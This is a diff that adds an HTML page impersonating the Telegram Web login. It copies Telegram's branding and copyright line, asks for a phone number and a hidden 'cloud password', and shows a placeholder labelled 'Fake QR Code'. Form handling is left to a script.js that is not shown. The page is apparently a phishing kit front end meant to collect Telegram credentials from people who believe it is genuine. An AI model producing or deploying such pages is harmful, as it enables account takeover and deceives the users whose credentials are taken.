@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Web - Log in</title>
+    <link rel="icon" type="image/png" href="https://web.telegram.org/a/favicon.ico">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="tg-login-wrapper">
+        <div class="tg-login-header">
+            <img src="https://web.telegram.org/a/img/logo.2023.svg" alt="Telegram" class="tg-logo">
+            <h1>Telegram Web</h1>
+        </div>
+        <div class="tg-login-content">
+            <h2>Sign in to Telegram</h2>
+            <p class="tg-intro-text">Please confirm your country code and enter your phone number.</p>
+
+            <form id="loginForm" class="tg-form">
+                <div class="form-group">
+                    <label for="countryCode" class="sr-only">Country Code</label>
+                    <select id="countryCode" class="form-control">
+                        <option value="+1">United States (+1)</option>
+                        <option value="+44">United Kingdom (+44)</option>
+                        <option value="+91">India (+91)</option>
+                        <option value="+233" selected>Ghana (+233)</option> <option value="+7">Russia (+7)</option>
+                        <option value="+49">Germany (+49)</option>
+                        </select>
+                    <label for="phoneNumber" class="sr-only">Phone Number</label>
+                    <input type="tel" id="phoneNumber" class="form-control" placeholder="Phone number" required>
+                </div>
+
+                <div class="form-group password-field" style="display: none;">
+                    <label for="password" class="sr-only">Password</label>
+                    <input type="password" id="password" class="form-control" placeholder="Password" required>
+                    <small class="password-hint">Enter your cloud password to log in.</small>
+                </div>
+                
+                <div id="errorMessage" class="error-message" style="display: none;"></div>
+
+                <button type="submit" class="btn btn-primary">NEXT</button>
+            </form>
+
+            <div class="tg-login-qr-code">
+                <p>or <a href="#" id="qrLoginLink">Log in by QR code</a></p>
+                <div id="qrCodeImage" style="display: none;">
+                    <img src="https://via.placeholder.com/200x200?text=Fake+QR+Code" alt="Fake QR Code">
+                    <p class="qr-code-instruction">Scan this QR code with the Telegram app on your phone.</p>
+                </div>
+            </div>
+
+            <div class="tg-footer">
+                <p>&copy; 2025 Telegram Messenger Inc.</p>
+            </div>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
